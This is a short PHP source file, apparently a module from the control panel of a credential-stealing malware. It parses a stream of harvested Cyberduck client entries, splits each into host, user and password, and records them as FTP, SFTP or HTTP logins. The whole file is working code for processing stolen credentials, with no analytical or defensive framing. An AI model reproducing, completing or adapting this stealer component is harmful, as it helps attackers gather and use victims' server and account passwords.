<?php
	class Module_cyberduck extends Module_
	{	
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$stream = new Stream($Data);
					while(TRUE)
					{
						$Host = $Pass = $User = $Prot = $Host_ = '';
						
						$Host = $stream->getSTRING_();
						if($Host == NULL)
							break;
						
						$Pass = $stream->getSTRING_();
						if(preg_match('/[a-z]+\:\/\//mi', $Host, $MatchResult))
							$Prot = $MatchResult[0];
						
						if($Pass != 'cyberduck@example.net')
						{
							$Parts = explode("@", $Host);
							if(sizeof($Parts) == 3)
							{
								$User = $Parts[0] . '@' . $Parts[1];
								$Host_ = $Parts[2];
							}
							else
							{
								$User = $Parts[0];
								$Host_ = $Parts[1];
							}
							
							$User = str_replace($Prot, '', $User);
							if ($Prot == 'ftp://' || $Prot == 'sftp://' || $Prot == 'ftps://' )
								$this->add_ftp($this->ftp_force_ssh($Host, $Prot == "sftp://"), $User, $Pass);
							else
								$this->add_http($Host, $User, $Pass);
						}
					}
					$stream = NULL;
					break;
				/*case 1:
					$stream = new Stream($Data);
					while(TRUE)
					{
						$Host = $stream->getSTRING_();
						if($Host == NULL)
							break;
						
					}
					$stream = NULL;
					break;*/
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}